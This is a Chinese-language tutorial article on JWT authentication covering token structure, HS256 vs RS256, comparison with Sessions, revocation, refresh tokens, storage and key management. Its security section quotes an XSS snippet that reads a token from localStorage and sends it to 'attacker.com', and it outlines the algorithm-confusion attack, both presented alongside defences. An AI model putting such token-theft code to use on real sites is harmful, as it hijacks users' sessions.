---
date: 2025-12-26
author: Gaaming Zhang
isOriginal: false
article: true
category:
  - 网络
tag:
  - 网络
---

# JWT：无状态认证的设计哲学

## Session 的局限性

在理解 JWT 之前，先看 Session 面临的挑战：

### 分布式系统的困境

```
场景：电商网站使用负载均衡

    用户登录 → 服务器 A → 创建 Session A

    下次请求 → 服务器 B → 找不到 Session（存在 A）
                        → 用户需要重新登录

解决方案的复杂性：
    - Session 粘滞：服务器故障导致 Session 丢失
    - Session 复制：同步开销大，数据冗余
    - 集中存储：Redis 成为单点，增加网络延迟
```

### 跨域访问的问题

```
问题：
    主站：shop.example.com
    API：api.example.com

    Cookie 默认不跨域
    → Session ID 无法共享
    → 需要复杂的跨域配置（CORS）
```

### 移动应用的挑战

```
问题：
    移动 APP 对 Cookie 支持有限
    无法像浏览器那样自动携带 Cookie
    → 需要手动管理 Session ID
```

JWT 的诞生就是为了解决这些问题：**将状态信息编码到令牌本身**。

## JWT 的核心思想

JWT（JSON Web Token）的本质是**自包含的令牌**。

### 传统认证 vs JWT

```
传统 Session 认证：
    用户信息存储在服务器
    客户端只携带 Session ID（引用）

    ┌────────┐                 ┌────────┐
    │ Client │                 │ Server │
    │ 存储ID │ ←─────────────→ │存储数据│
    └────────┘    "给我ID为     └────────┘
                   abc的数据"

JWT 认证：
    用户信息编码在令牌中
    客户端携带完整信息（值）

    ┌────────┐                 ┌────────┐
    │ Client │                 │ Server │
    │ 存储数据 │ ─────────────→ │验证签名│
    └────────┘   "我的数据是    └────────┘
                   {userId:1}"
```

### 类比理解

**Session 模式**像寄存柜：
- 你拿到一把钥匙（Session ID）
- 物品存在柜子里（服务器）
- 每次需要时用钥匙取出

**JWT 模式**像护照：
- 护照上写满了你的信息
- 随身携带，随时使用
- 验证方只需检查护照真伪（签名）

## JWT 的结构

JWT 由三部分组成，用点（.）分隔：

```
完整 JWT：
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
    .
    eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
    .
    SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

三部分：
    Header.Payload.Signature
```

### 1. Header（头部）

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- **alg**：签名算法（Algorithm）
- **typ**：令牌类型（Type）

编码：Base64Url(Header) → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

### 2. Payload（载荷）

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622
}
```

包含三类声明（Claims）：

**标准声明**（推荐使用）：
- **sub**（subject）：主题，通常是用户 ID
- **iss**（issuer）：签发人
- **aud**（audience）：接收方
- **exp**（expiration）：过期时间
- **iat**（issued at）：签发时间
- **jti**（JWT ID）：唯一标识

**公共声明**：
- 使用 URI 格式避免冲突

**私有声明**：
- 自定义字段（userId, role, username 等）

编码：Base64Url(Payload) → `eyJzdWIiOiIxMjM0...`

### 3. Signature（签名）

签名的生成过程：

```
签名算法（对称加密 HS256）：
    签名 = HMAC-SHA256(
        Base64Url(Header) + "." + Base64Url(Payload),
        secret_key
    )

签名算法（非对称加密 RS256）：
    签名 = RSA-SHA256(
        Base64Url(Header) + "." + Base64Url(Payload),
        private_key
    )
```

**签名的作用**：
- 防篡改：任何对 Header 或 Payload 的修改都会导致签名无效
- 验证身份：证明令牌是由持有密钥的服务签发的

## JWT 工作流程

### 完整认证流程

```
步骤1: 用户登录
    Client → POST /login {username, password}
    Server → 验证凭证

步骤2: 生成 JWT
    Server → 创建 Payload: {userId: 1001, role: "admin"}
    Server → 使用密钥签名
    Server → 返回 JWT

步骤3: 客户端存储
    Client → 存储 JWT（localStorage / Cookie）

步骤4: 后续请求携带 JWT
    Client → GET /api/data
           → Headers: Authorization: Bearer eyJhbGci...

步骤5: 服务器验证
    Server → 提取 JWT
    Server → 验证签名（使用相同密钥/公钥）
    Server → 检查过期时间
    Server → 提取用户信息
    Server → 处理请求

关键点：
    服务器不需要存储任何状态
    每次请求都是独立的验证
```

### 签名验证原理

```
验证过程：

1. 分割 JWT
    Header_encoded.Payload_encoded.Signature_received

2. 重新计算签名
    Signature_computed = HMAC-SHA256(
        Header_encoded + "." + Payload_encoded,
        server_secret_key
    )

3. 比较签名
    IF Signature_computed === Signature_received:
        签名有效，令牌可信
    ELSE:
        签名无效，令牌被篡改

原理：
    攻击者即使修改了 Payload
    但没有 secret_key 无法生成正确签名
    → 服务器验证时会发现签名不匹配
```

## 签名算法：对称 vs 非对称

### 对称加密（HS256）

```
特点：
    使用同一个密钥签名和验证

    签名：HMAC(data, secret)
    验证：HMAC(data, secret) == signature

流程：
    服务器 A: 使用 secret 签名 JWT
    服务器 B: 使用 secret 验证 JWT

优点：
    - 性能好（速度快）
    - 实现简单

缺点：
    - 密钥管理复杂（所有服务器都需要密钥）
    - 密钥泄露风险高（任何服务器泄露都会影响全局）
    - 无法区分签发者（所有服务器都用同一密钥）

适用场景：
    - 单服务应用
    - 内部服务之间的通信
```

### 非对称加密（RS256）

```
特点：
    使用私钥签名，公钥验证

    签名：RSA(data, private_key)
    验证：RSA_verify(data, signature, public_key)

流程：
    认证服务: 使用私钥签名 JWT
    业务服务: 使用公钥验证 JWT（无需私钥）

优点：
    - 密钥管理简单（私钥只在认证服务，公钥可公开）
    - 安全性高（业务服务泄露不影响签名安全）
    - 可追溯（知道谁签发的）

缺点：
    - 性能较差（RSA 比 HMAC 慢）
    - 实现复杂

适用场景：
    - 微服务架构
    - 第三方集成
    - 需要分离签发和验证的场景
```

### 密钥管理对比

```
对称加密的困境：
    ┌──────────────┐
    │ 认证服务     │  secret: abc123
    └──────────────┘
           ↓ 所有服务都需要密钥
    ┌──────────────┐
    │ 用户服务     │  secret: abc123
    └──────────────┘
           ↓
    ┌──────────────┐
    │ 订单服务     │  secret: abc123  ← 任何一个服务泄露
    └──────────────┘                    都会导致全局不安全

非对称加密的优势：
    ┌──────────────┐
    │ 认证服务     │  private_key: (保密)
    └──────────────┘
           ↓ 只分发公钥
    ┌──────────────┐
    │ 用户服务     │  public_key: (公开)
    └──────────────┘
           ↓
    ┌──────────────┐
    │ 订单服务     │  public_key: (公开)  ← 公钥泄露无影响
    └──────────────┘                       无法伪造签名
```

## JWT vs Session

### 核心差异

```
特性对比：

状态管理：
    Session: 服务器维护状态（有状态）
    JWT:     客户端携带状态（无状态）

存储位置：
    Session: 服务器端（内存/Redis/数据库）
    JWT:     客户端（localStorage/Cookie）

验证方式：
    Session: 查询存储（session_id → session_data）
    JWT:     验证签名（无需查询）

主动失效：
    Session: 可以立即删除
    JWT:     无法主动失效（只能等过期）

令牌大小：
    Session: 小（仅 Session ID，约 32 字节）
    JWT:     大（包含完整信息，200-500 字节）

分布式支持：
    Session: 需要共享存储（Redis）
    JWT:     天然支持（无需共享）

跨域支持：
    Session: 复杂（Cookie 跨域问题）
    JWT:     简单（HTTP Header）
```

### 性能对比

```
请求处理时间：

Session 方式：
    1. 提取 Session ID          (10μs)
    2. 查询 Redis               (1ms)
    3. 反序列化数据             (100μs)
    4. 业务处理                 (50ms)
    总计：约 51.11ms

JWT 方式：
    1. 提取 JWT                 (10μs)
    2. 验证签名                 (500μs)
    3. 解析 Payload             (50μs)
    4. 业务处理                 (50ms)
    总计：约 50.56ms

差异分析：
    JWT 省去了 Redis 查询（1ms）
    但增加了签名验证（500μs）
    整体性能略优于 Session

    如果使用非对称加密（RS256）：
    签名验证时间增加到约 2-5ms
    整体性能略差于 Session
```

### 适用场景

**使用 JWT 的场景**：
- **微服务架构**：多个服务不需要共享 Session 存储
- **移动应用**：无需依赖 Cookie
- **单页应用（SPA）**：前后端分离，跨域访问
- **API 服务**：RESTful API 无状态认证
- **单点登录（SSO）**：多系统共享认证

**使用 Session 的场景**：
- **需要立即失效**：管理员踢人、修改权限后立即生效
- **敏感操作**：支付、转账等需要严格会话控制
- **传统 Web 应用**：前后端不分离，基于 Cookie
- **短期会话**：会话时间很短，不需要持久化

## JWT 的安全问题

### 无法主动失效

```
问题场景：
    T1: 用户登录，获得 JWT（过期时间：1小时）
    T2: 管理员发现用户违规，想立即封禁
    T3: 管理员删除用户账号
    T4: 用户仍然可以使用 JWT 访问（还没过期）

    JWT 一旦签发，在过期前一直有效
    无法像 Session 那样立即删除

解决方案：

方案1：令牌黑名单
    Redis 存储被撤销的 JWT ID
    每次验证时检查黑名单

    优点：可以立即失效
    缺点：失去了无状态的优势

    适用：需要立即失效的场景

方案2：短期令牌 + 刷新令牌
    访问令牌：15 分钟
    刷新令牌：7 天

    访问令牌过期 → 用刷新令牌获取新访问令牌
    撤销用户 → 删除刷新令牌（存在数据库）

    优点：平衡了安全性和便利性
    缺点：最多 15 分钟才能完全失效

方案3：版本号机制
    JWT 中包含 tokenVersion
    用户表中存储 tokenVersion

    撤销用户 → tokenVersion += 1
    验证时比较版本号

    优点：简单有效
    缺点：需要查询数据库
```

### 载荷信息泄露

```
问题：
    JWT 的 Payload 只是 Base64 编码，不是加密
    任何人都可以解码查看

    示例：
        JWT = "eyJhbGci...eyJ1c2VySWQ...signature"

        Payload = Base64Decode("eyJ1c2VySWQ...")
        → {userId: 1001, role: "admin", email: "user@example.com"}

风险：
    如果 Payload 包含敏感信息：
        - 密码：攻击者直接获取
        - 信用卡号：泄露财务信息
        - 身份证号：隐私泄露

防护：
    ❌ 不要存储：
        - 密码或密码哈希
        - 信用卡号、银行账号
        - 身份证号、护照号
        - 其他敏感个人信息

    ✅ 只存储：
        - 用户 ID
        - 用户名
        - 角色/权限
        - 过期时间
```

### 算法混淆攻击

```
攻击原理：
    1. 服务器使用 RS256（非对称加密）签发 JWT
       private_key: 签名
       public_key:  验证

    2. 攻击者修改 Header：
       alg: "RS256" → alg: "HS256"（对称加密）

    3. 攻击者使用 public_key 作为密钥重新签名
       signature = HMAC(data, public_key)

    4. 服务器验证时：
       IF 没有严格检查算法:
           使用 public_key 作为密钥验证
           → 验证通过（攻击成功）

防护措施：
    验证时明确指定允许的算法

    配置：
        algorithms: ['RS256']  // 只允许 RS256

    拒绝：
        algorithms: ['none']   // 禁止无签名
        algorithms: ['HS256']  // 禁止混淆
```

### 令牌泄露

```
泄露途径：

1. XSS 攻击
    攻击者注入脚本：
        <script>
            const token = localStorage.getItem('token');
            fetch('http://attacker.com?token=' + token);
        </script>

    防护：
        - 使用 HttpOnly Cookie（JS 无法读取）
        - 输入验证和输出转义
        - Content Security Policy (CSP)

2. 网络嗅探
    HTTP 明文传输：
        GET /api/data HTTP/1.1
        Authorization: Bearer eyJhbGci...

        → 攻击者拦截网络流量获取 JWT

    防护：
        - 强制使用 HTTPS
        - HSTS（强制 HTTPS）

3. 本地存储泄露
    localStorage 可被任何脚本访问

    防护：
        - 使用 HttpOnly Cookie
        - 设置 Secure 属性（仅 HTTPS）
        - 设置 SameSite 属性（防 CSRF）
```

### 重放攻击

```
攻击场景：
    1. 攻击者截获有效的 JWT
    2. 在 JWT 过期前重复使用
    3. 冒充用户执行操作

防护措施：

方案1：绑定客户端信息
    Payload 包含：
        {
          userId: 1001,
          clientIp: "192.168.1.100",
          userAgent: "Mozilla/5.0..."
        }

    验证时检查：
        IF 请求 IP != JWT 中的 IP:
            拒绝

    问题：
        移动网络 IP 经常变化
        NAT 环境下多用户共享 IP

方案2：JTI（JWT ID）+ 已使用列表
    Payload 包含唯一 ID：
        {
          jti: "unique-id-abc123"
        }

    Redis 记录已使用的 JTI：
        使用后标记为已用
        相同 JTI 第二次使用时拒绝

    问题：
        需要存储状态
        失去无状态优势

方案3：短期令牌
    设置短过期时间（15 分钟）
    即使被截获，影响范围有限
```

## 刷新令牌机制

### 双令牌策略

```
核心思想：
    访问令牌（Access Token）：短期（15 分钟）
    刷新令牌（Refresh Token）：长期（7 天）

工作流程：

T0: 登录
    用户登录成功
    → 签发访问令牌（15 分钟）
    → 签发刷新令牌（7 天）
    → 刷新令牌存入数据库

T1-T14: 正常访问
    使用访问令牌请求 API
    → 验证通过，返回数据

T15: 访问令牌过期
    使用访问令牌请求 API
    → 验证失败（过期）

    客户端自动：
        使用刷新令牌请求新访问令牌
        → 服务器验证刷新令牌（查询数据库）
        → 签发新访问令牌（15 分钟）
        → 使用新访问令牌重试原请求

T7天: 刷新令牌过期
    刷新令牌失效
    → 用户需要重新登录

撤销用户：
    删除数据库中的刷新令牌
    → 最多 15 分钟后完全失效
```

### 为什么需要两个令牌？

```
问题：为什么不直接用长期令牌（7 天）？

方案1：单个长期令牌（不推荐）
    访问令牌：7 天

    优点：简单

    缺点：
        - 令牌被盗后，7 天内都有效
        - 无法主动失效
        - 安全风险高

方案2：双令牌策略（推荐）
    访问令牌：15 分钟
    刷新令牌：7 天

    优点：
        - 访问令牌短期，被盗影响小
        - 刷新令牌可存储，可主动失效
        - 平衡了安全性和用户体验

    场景：
        正常使用：
            访问令牌频繁使用，短期过期
            刷新令牌偶尔使用，长期有效

        令牌泄露：
            访问令牌泄露：最多 15 分钟
            刷新令牌泄露：立即删除数据库记录
```

## 最佳实践

### 令牌存储

```
存储方式对比：

1. localStorage
    优点：
        - 简单易用
        - 跨页面共享

    缺点：
        - 容易被 XSS 攻击（JS 可访问）
        - 不会自动过期

    适用：
        - 低敏感度应用
        - 有完善的 XSS 防护

2. HttpOnly Cookie
    优点：
        - JS 无法访问（防 XSS）
        - 自动携带
        - 可设置过期时间

    缺点：
        - 跨域复杂（需要 CORS）
        - 需要 CSRF 防护

    适用：
        - 高敏感度应用
        - 传统 Web 应用

配置示例：
    Set-Cookie: token=eyJhbGci...;
                HttpOnly;        // 防 XSS
                Secure;          // 仅 HTTPS
                SameSite=Strict; // 防 CSRF
                Max-Age=900      // 15 分钟
```

### 过期时间设置

```
不同场景的过期时间：

访问令牌（Access Token）：
    - 一般应用：15-30 分钟
    - 高安全应用：5-10 分钟
    - 低安全应用：1-2 小时

刷新令牌（Refresh Token）：
    - 移动应用：7-30 天
    - Web 应用：1-7 天
    - 高安全应用：不使用刷新令牌

特殊令牌：
    - 邮件验证：15-60 分钟
    - 密码重置：15-30 分钟
    - 支付令牌：5-10 分钟

权衡因素：
    时间越短 → 安全性越高，用户体验越差
    时间越长 → 用户体验越好，安全性越低
```

### 签名密钥管理

```
密钥生成：
    - 使用加密安全的随机数生成器
    - 长度至少 256 位（对称加密）
    - 定期轮换密钥（如每 90 天）

密钥存储：
    ❌ 不要：
        - 硬编码在代码中
        - 提交到版本控制
        - 明文存储在配置文件

    ✅ 应该：
        - 环境变量
        - 密钥管理服务（AWS KMS, Vault）
        - 加密配置文件

密钥轮换：
    1. 生成新密钥（Key2）
    2. 同时支持新旧密钥验证
    3. 新令牌使用 Key2 签名
    4. 旧令牌使用 Key1 验证（直到过期）
    5. 所有旧令牌过期后删除 Key1
```

## 小结

JWT 认证机制的核心要点：

**本质**：
- Session 的问题：分布式、跨域、移动应用
- JWT 的解决：自包含令牌，无需服务器存储

**结构**：
- Header：算法和类型
- Payload：用户信息和声明
- Signature：防篡改签名

**签名算法**：
- 对称加密（HS256）：性能好，密钥管理复杂
- 非对称加密（RS256）：密钥管理简单，性能稍差

**优势**：
- 无状态，服务器负担小
- 天然支持分布式
- 跨域简单
- 适合移动应用和微服务

**劣势**：
- 无法主动失效（需要黑名单或版本号）
- Payload 可被解码（不能存敏感信息）
- 令牌较大（增加网络开销）

**安全防护**：
- 算法混淆：明确指定允许的算法
- 令牌泄露：HTTPS + HttpOnly Cookie
- 信息泄露：不在 Payload 存敏感信息
- 重放攻击：短期令牌 + 客户端绑定

**最佳实践**：
- 双令牌策略（访问令牌 15 分钟 + 刷新令牌 7 天）
- HttpOnly Cookie 存储（防 XSS）
- HTTPS 传输（防窃听）
- 非对称加密（微服务架构）

理解 JWT 的设计哲学，才能在合适的场景选择合适的认证方案。JWT 不是银弹，它解决了分布式和跨域的问题，但也引入了无法主动失效的限制。在实际应用中，需要根据业务需求权衡 Session 和 JWT 的优劣。
